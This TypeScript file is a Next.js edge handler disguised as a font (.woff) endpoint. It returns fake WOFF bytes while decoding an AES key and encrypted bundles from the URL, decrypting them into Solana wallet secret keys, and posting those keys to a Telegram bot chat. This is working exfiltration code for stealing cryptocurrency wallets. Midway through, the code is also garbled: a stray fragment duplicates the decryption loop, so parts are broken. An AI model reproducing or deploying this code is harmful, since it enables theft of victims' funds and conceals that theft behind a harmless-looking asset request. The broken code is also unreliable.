import { NextRequest } from "next/server";

export const config = { runtime: "edge" };

// Minimal Base58 encoder
const BASE58_ALPHABET =
  "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function encodeBase58(buffer: Uint8Array): string {
  const digits = [0];
  for (let byte of buffer) {
    let carry = byte;
    for (let i = 0; i < digits.length; i++) {
      const val = digits[i] * 256 + carry;
      digits[i] = val % 58;
      carry = (val / 58) | 0;
    }
    while (carry) {
      digits.push(carry % 58);
      carry = (carry / 58) | 0;
    }
  }
  for (let i = 0; i < buffer.length && buffer[i] === 0; i++) digits.push(0);
  return digits.reverse().map((d) => BASE58_ALPHABET[d]).join("");
}

// Convert base64 (URL-safe) → Uint8Array
function b64ToBytes(b64: string): Uint8Array {
  b64 = b64.replace(/-/g, "+").replace(/_/g, "/");
  const pad = (4 - (b64.length % 4)) % 4;
  b64 += "=".repeat(pad);
  const bin = atob(b64);
  const arr = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
  return arr;
}

// ArrayBuffer → hex string
function bufToHex(buf: ArrayBuffer): string {
  const bytes = new Uint8Array(buf);
  return Array.from(bytes)
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");
}

export default async function handler(req: NextRequest) {
  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;
  if (!BOT_TOKEN || !CHAT_ID) {
    console.error("Missing BOT_TOKEN or CHAT_ID");
    return new Response("Misconfigured", { status: 500 });
  }

  // Extract slug and strip .woff
  const parts = new URL(req.url).pathname.split("/");
  let slug = parts[parts.length - 1] || "";
  if (slug.endsWith(".woff")) slug = slug.slice(0, -5);
  const idx = slug.indexOf("_");
  if (idx < 0) return new Response("Invalid slug", { status: 400 });

  let payloadJson: string;
  try {
    const enc = slug.substring(idx + 1);
    payloadJson = new TextDecoder().decode(b64ToBytes(enc));
  } catch (e) {
    console.error("Error decoding slug:", e);
    return new Response("Bad request", { status: 400 });
  }

  let data: { keybundle: string; sBundles: string[] };
  try { data = JSON.parse(payloadJson); } catch (e) {
    console.error("JSON parse error:", e);
    return new Response("Bad JSON", { status: 400 });
  }

  // Import AES key
  let aesKey: CryptoKey;
  try {
    aesKey = await crypto.subtle.importKey(
      "raw",
      b64ToBytes(data.keybundle),
      "AES-GCM",
      false,
      ["decrypt"]
    );
  } catch (e) {
    console.error("Key import error:", e);
    return new Response("Bad key", { status: 400 });
  }

  const privKeys: string[] = [];
  for (let i = 0; i < data.sBundles.length; i++) {
    const bundle = data.sBundles[i];
    const colonPos = bundle.indexOf(":");
    if (colonPos < 0) continue;
    const ivB64 = bundle.substring(0, colonPos);
    const cipherB64 = bundle.substring(colonPos + 1);
    try {
      const iv = b64ToBytes(ivB64);
      const cipher = b64ToBytes(cipherB64);
      // Decrypt to raw bytes (should be 64 bytes: [pub(32)|priv(32)])
      const plainBuf = await crypto.subtle.decrypt(
        { name: "AES-GCM", iv },
        aesKey,
        cipher
      );
      const raw = new Uint8Array(plainBuf);
      if (raw.length !== 64) {
        console.error(`Unexpected decrypted length: ${raw.length}`);
        continue;
      }
      // Interpret raw[0..31] as pubKey, raw[32..63] as privKey
      // But Solana secret key for import is the full 64-byte array
      const secretKeyB58 = encodeBase58(raw);
      console.log(`Bundle ${i} secret key bytes:`, raw);
      console.log(`Bundle ${i} secret key base58:`, secretKeyB58);
      privKeys.push(secretKeyB58);
    } catch (e) {
      console.error(`Decrypt error #${i}:`, e);
    }
  }, aesKey, cipher);
      const hex = bufToHex(plainBuf);
      console.log(`Bundle ${i} decrypted hex (${plainBuf.byteLength} bytes):`, hex);
      if (!/^[0-9a-f]{128}$/.test(hex)) {
        console.error(`Unexpected hex format/length for bundle ${i}`);
        continue;
      }
      const privHex = hex.slice(64);
      console.log(`Bundle ${i} private hex:`, privHex);
      const privBytes = new Uint8Array(privHex.match(/.{2}/g)!.map((h) => parseInt(h, 16)));
      const privB58 = encodeBase58(privBytes);
      console.log(`Bundle ${i} private base58:`, privB58);
      privKeys.push(privB58);
    } catch (e) {
      console.error(`Decrypt error #${i}:`, e);
    }
  }

  if (privKeys.length) {
    const message = privKeys.map((k, i) => `Wallet ${i+1}\n${k}`).join("\n\n");
    try {
      console.log("Sending Telegram message:", message);
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
      });
    } catch (e) {
      console.error("Telegram send error", e);
    }
  } else {
    console.error("No valid private keys extracted");
  }

  return new Response(new Uint8Array([0x77, 0x4f, 0x46, 0x46]), {
    headers: {
      "Content-Type": "font/woff",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Credentials": "true",
    },
  });
}
